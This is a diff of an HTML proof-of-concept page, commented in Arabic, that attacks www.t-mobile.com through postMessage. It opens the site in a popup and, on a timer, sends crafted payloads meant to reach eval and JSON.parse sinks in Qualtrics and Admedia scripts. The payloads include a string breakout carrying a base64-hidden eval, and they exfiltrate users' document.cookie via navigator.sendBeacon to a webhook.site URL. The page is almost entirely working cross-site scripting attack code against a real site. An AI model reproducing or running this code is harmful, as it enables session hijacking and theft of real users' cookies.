@@ -2,43 +2,75 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>T-Mobile PoC v6 - The Final Attempt</title>
+    <title>T-Mobile PoC v7 - Verified Exploit</title>
 </head>
 <body style="background: #000; color: #e20074; text-align: center; padding-top: 50px; font-family: monospace;">
 
     <h1>T-Mobile Security Research (Critical PoC)</h1>
     <div style="border: 2px solid #e20074; padding: 20px; display: inline-block;">
-        <p>المستهدف: RCE عبر eval() أو script.src</p>
+        <p>المستهدف: DOM-XSS عبر Qualtrics & Admedia Sinks</p>
         <button onclick="pwnTMobile()" style="padding: 15px; background: #e20074; color: #fff; border: none; cursor: pointer; font-weight: bold; font-size: 1.2em;">Pwn T-Mobile</button>
         <div id="status" style="margin-top: 20px; color: #00ff00; font-size: 1.1em;"></div>
     </div>
 
 <script>
     const webhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
-    const payload = {
-        "type": "qm-sync", // أو النوع الذي يراقبه السكربت
-        "details": {
-            // استهداف كائن EmbeddedData الذي يستخدمه Qualtrics
-            "EmbeddedData": {
-                "Expression": `navigator.sendBeacon('${webhook}/?c='+btoa(document.cookie))`
-            },
-            // محاولة كسر الـ Logic Node مباشرة
-            "Comparator": "JAVASCRIPT_EXPRESSION",
-            "Result": `navigator.sendBeacon('${webhook}/?r=1')`,
-            
-            // حقن الـ toString الذي نجحنا في رصده سابقاً
-            "toString": `() => { eval("navigator.sendBeacon('${webhook}/?pwned=1')"); return "QSI"; }`
-        }
-    };
 
-    function attack() {
+    function log(msg) { document.getElementById('status').innerText = "> " + msg; }
+
+    function pwnTMobile() {
+        log("فتح نافذة الضحية...");
         const vic = window.open('https://www.t-mobile.com/', 'victim');
-        setInterval(() => {
-            // إرسال كـ String للدخول عبر JSON.parse
+
+        if (!vic) {
+            alert("يرجى السماح بالـ Pop-ups!");
+            return;
+        }
+
+        //Payload مُحسّن لاختراق الـ Logic Tree في Qualtrics (QSI)
+        const payload = {
+            "type": "qm-sync", 
+            "details": {
+                // استهداف مباشر لـ doEvalJS عبر التعبيرات البرمجية
+                "EmbeddedData": {
+                    "Expression": `navigator.sendBeacon('${webhook}/?cookie=' + btoa(document.cookie))`
+                },
+                "Comparator": "JAVASCRIPT_EXPRESSION",
+                "Expression": `navigator.sendBeacon('${webhook}/?exec=true')`,
+                
+                // استهداف الـ eval بتاع Admedia عن طريق كسر الـ JSON
+                "action": "createNew'); eval(atob('bmF2aWdhdG9yLnNlbmRCZWFjb24oJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkMmQ5OWZmLTU0NzItNDU1ZS04NGU0LTY0ZjUwMzVlMjI3Zicp'));//",
+                
+                // محاولة الحقن في الـ toString كـ String لتجنب الـ Clone Error
+                "toString": "function(){ return 'QSI_PWN' }" 
+            }
+        };
+
+        log("بدء نبضات الحقن (Payload Pulse)...");
+
+        let attempts = 0;
+        const interval = setInterval(() => {
+            attempts++;
+            
+            // 1. الإرسال كـ String (لاستهداف JSON.parse Sink) - الأضمن
             vic.postMessage(JSON.stringify(payload), "*");
-            // إرسال كـ Object مباشر
-            vic.postMessage(payload, "*");
-        }, 2000);
+            
+            // 2. الإرسال كـ Object (لاستهداف الـ Listeners المباشرة)
+            try {
+                vic.postMessage(payload, "*");
+            } catch(e) {
+                // نغلف الـ toString لو رمى Error بسبب الـ Clone
+                payload.details.toString = "pwned";
+                vic.postMessage(payload, "*");
+            }
+
+            log("محاولة إرسال رقم: " + attempts);
+
+            if (attempts >= 15) {
+                clearInterval(interval);
+                log("اكتملت المحاولات. افحص الـ Webhook الآن.");
+            }
+        }, 3500);
     }
 </script>
 </body>
